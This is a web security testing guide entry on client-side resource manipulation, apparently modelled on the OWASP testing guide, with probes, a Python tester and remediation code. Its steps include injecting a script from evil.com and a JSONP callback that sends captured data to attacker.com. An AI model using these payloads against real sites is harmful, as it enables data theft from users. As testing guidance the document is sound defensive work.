# WSTG-CLNT-06: Testing for Client-Side Resource Manipulation

## Test ID
WSTG-CLNT-06

## Test Name
Testing for Client-Side Resource Manipulation

## High-Level Description

Client-side resource manipulation occurs when attackers can control what resources (scripts, styles, images) a page loads. This can lead to loading malicious scripts, defacement, or data theft by manipulating URLs of external resources.

---

## What to Check

- [ ] Dynamic script loading
- [ ] User-controlled src attributes
- [ ] JSONP endpoints
- [ ] Dynamic CSS loading
- [ ] iframe src manipulation

---

## How to Test

### Step 1: Test Script Source Manipulation

```bash
#!/bin/bash
TARGET="https://target.com"

# Check if script sources can be manipulated
curl -s "$TARGET/page?script=https://evil.com/malicious.js" | grep -i "script.*src"
curl -s "$TARGET/page?callback=alert" | grep -i "callback"
```

### Step 2: JSONP Exploitation

```javascript
// If JSONP callback can be controlled:
// https://target.com/api/data?callback=stealData

function stealData(data) {
    // Send data to attacker
    fetch('https://attacker.com/log?data=' + JSON.stringify(data));
}
```

### Step 3: Resource Manipulation Tester

```python
#!/usr/bin/env python3
import requests
import re

class ResourceManipulationTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.findings = []

    def test_script_injection(self, endpoint, param):
        """Test if external scripts can be loaded"""
        print(f"[*] Testing script source manipulation")

        payload = "https://evil.com/malicious.js"
        response = requests.get(
            f"{self.base_url}{endpoint}",
            params={param: payload}
        )

        if f'src="{payload}"' in response.text or f"src='{payload}'" in response.text:
            print(f"[VULN] Script source manipulation possible")
            self.findings.append({
                "issue": "External script loading",
                "severity": "High"
            })

    def test_jsonp(self, endpoint):
        """Test JSONP callback manipulation"""
        print(f"[*] Testing JSONP callback")

        response = requests.get(
            f"{self.base_url}{endpoint}",
            params={"callback": "alert"}
        )

        if "alert(" in response.text:
            print(f"[VULN] JSONP callback controllable")
            self.findings.append({
                "issue": "JSONP callback manipulation",
                "severity": "Medium"
            })

# Usage
tester = ResourceManipulationTester("https://target.com")
tester.test_script_injection("/page", "src")
tester.test_jsonp("/api/data")
```

---

## Remediation

```javascript
// Validate resource URLs
const ALLOWED_DOMAINS = ['cdn.example.com', 'static.example.com'];

function loadScript(url) {
    try {
        const parsed = new URL(url);
        if (ALLOWED_DOMAINS.includes(parsed.hostname)) {
            const script = document.createElement('script');
            script.src = url;
            document.body.appendChild(script);
        }
    } catch (e) {
        console.error('Invalid URL');
    }
}

// Use CSP to restrict resource loading
// Content-Security-Policy: script-src 'self' cdn.example.com
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| External script loading | 8.6 | High |
| JSONP callback manipulation | 6.1 | Medium |

---

## Checklist

```
[ ] Script sources analyzed
[ ] JSONP endpoints tested
[ ] iframe sources checked
[ ] CSS sources tested
[ ] Findings documented
```
